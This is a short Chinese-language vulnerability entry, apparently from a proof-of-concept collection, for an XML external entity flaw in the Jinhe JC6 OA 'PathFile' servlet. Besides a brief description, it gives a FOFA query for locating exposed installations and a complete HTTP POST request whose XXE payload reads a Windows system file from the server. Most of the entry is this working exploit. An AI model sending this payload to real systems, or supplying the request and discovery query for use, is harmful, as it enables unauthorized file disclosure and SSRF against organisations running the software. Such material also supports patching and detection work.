## 金和 JC6 PathFile XML实体注入漏洞

## 漏洞描述
金和 JC6 OA `PathFile` 接口在解析 XML 时未禁用外部实体，攻击者可通过 XXE 读取服务器文件或发起 SSRF。

## 网络空间测绘
```
fofa: app="金和网络-金和OA"
```

## POC
```
POST /jc6/servlet/PathFile?GetUrl HTTP/1.1
Host: [请补充实际域名]
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36
Accept: */*
Accept-Encoding: gzip, deflate
Content-Type: application/xml
Connection: close

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "file:///C:/Windows/win.ini">
]>
<root>
  <path>&xxe;</path>
  <strType>file</strType>
  <IsVir>no</IsVir>
  <displayType>list</displayType>
  <strFiles>*</strFiles>
</root>
```

## 参考
- 社区情报

